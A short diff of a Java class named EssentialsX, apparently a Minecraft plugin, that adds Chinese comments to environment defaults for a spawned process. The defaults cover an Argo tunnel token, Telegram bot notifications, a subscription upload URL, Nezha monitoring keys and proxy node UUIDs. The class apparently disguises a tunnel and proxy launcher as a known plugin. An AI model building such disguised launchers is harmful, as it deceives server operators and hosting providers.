@@ -145,20 +145,20 @@ public class EssentialsX extends JavaPlugin {
         Map<String, String> env = pb.environment();
         
         // Set default values
-        env.put("TOK", "");
-        env.put("ARGO_DOMAIN", "");
-        env.put("TG", "");
-        env.put("SUB_URL", "");
-        env.put("NEZHA_SERVER", "");
-        env.put("NEZHA_KEY", "");
+        env.put("TOK", ""); //固定隧道token
+        env.put("ARGO_DOMAIN", "");//固定隧道域名
+        env.put("TG", "");//TG通知，格式: "CHAT_ID BOT_TOKEN"
+        env.put("SUB_URL", "");//订阅上传地址
+        env.put("NEZHA_SERVER", ""); //哪吒服务器
+        env.put("NEZHA_KEY", ""); //哪吒密钥
         env.put("NEZHA_PORT", "443");
         env.put("NEZHA_TLS", "1");
-        env.put("TMP_ARGO", "vms");
-        env.put("EKEY", "");
-        env.put("SUB_NAME", "argo");
-        env.put("CF_IP", "ip.sb");
-        env.put("AGENT_UUID", "");
-        env.put("UUID", "");
+        env.put("TMP_ARGO", "vms");//节点类型
+        env.put("EKEY", "");  //ech 密钥
+        env.put("SUB_NAME", "argo"); //节点名称
+        env.put("CF_IP", "ip.sb");  //优选ip
+        env.put("AGENT_UUID", ""); //哪吒客户端uuid
+        env.put("UUID", "");//节点uuid
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
